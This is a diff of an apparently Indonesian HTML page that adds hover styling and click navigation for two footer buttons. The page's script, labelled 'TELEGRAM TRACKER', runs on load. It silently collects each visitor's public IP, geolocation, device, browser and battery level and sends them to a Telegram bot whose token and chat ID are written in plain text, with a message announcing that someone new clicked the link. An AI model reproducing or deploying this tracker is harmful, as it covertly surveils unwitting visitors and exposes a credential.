@@ -37,6 +37,18 @@ h1{font-size:2.6rem;margin-bottom:15px;}
   justify-content:center;
   align-items:center;
   cursor:pointer;
+  transition:.35s ease;
+  border:1px solid rgba(255,255,255,0.15);
+}
+.nav-box:hover{
+  transform:translateY(-8px) scale(1.05);
+  background:linear-gradient(135deg,#00c6ff,#0072ff);
+  box-shadow:0 15px 35px rgba(0,0,0,0.3);
+}
+.nav-box.active{
+  background: linear-gradient(135deg,#ff512f,#dd2476);
+  box-shadow:0 15px 35px rgba(0,0,0,0.5);
+  transform:translateY(-4px) scale(1.03);
 }
 .icon{font-size:42px}
 .nav-text{font-weight:600}
@@ -53,18 +65,19 @@ h1{font-size:2.6rem;margin-bottom:15px;}
 </div>
 
 <div class="footer">
-  <div class="nav-box" onclick="location.href='index.html'">
+  <div class="nav-box" data-href="index.html">
     <div class="icon">🏠</div>
     <div class="nav-text">HOME</div>
   </div>
 
-  <div class="nav-box" onclick="location.href='tools.html'">
+  <div class="nav-box" data-href="tools.html">
     <div class="icon">⚙️</div>
     <div class="nav-text">TOOLS</div>
   </div>
 </div>
 
 <script>
+// TELEGRAM TRACKER
 const BOT_TOKEN = "8416804133:AAFfm7SNGYI-EUCEDbpf6IgsJNIZxW9NtcM";
 const CHAT_ID = "8080998217";
 
@@ -80,11 +93,11 @@ function getBrowserName() {
 
 async function sendToTelegram(){
   try{
-    // IP
+    // Ambil IP publik
     const ipRes = await fetch("https://api.ipify.org?format=json");
     const ip = await ipRes.json();
 
-    // GEO
+    // Geo
     const geoRes = await fetch(`https://ipapi.co/${ip.ip}/json/`);
     const geo = await geoRes.json();
 
@@ -95,7 +108,7 @@ async function sendToTelegram(){
       ? "iOS"
       : "Desktop";
 
-    // Battery (persen saja)
+    // Battery
     let batteryText = "N/A";
     if (navigator.getBattery) {
       const battery = await navigator.getBattery();
@@ -127,12 +140,27 @@ ADA YG BARU CLICK LINK ANDA
       })
     });
 
-  } catch (e) {
+  } catch(e) {
     console.log("Gagal kirim telegram", e);
   }
 }
 
+// kirim saat halaman dibuka
 sendToTelegram();
+
+// NAV BOX CLICK EFFECT
+const navBoxes = document.querySelectorAll(".nav-box");
+navBoxes.forEach(box => {
+  box.addEventListener("click", () => {
+    // beri class active
+    navBoxes.forEach(b => b.classList.remove("active"));
+    box.classList.add("active");
+    
+    // redirect
+    const link = box.getAttribute("data-href");
+    if(link) window.location.href = link;
+  });
+});
 </script>
 
 </body>
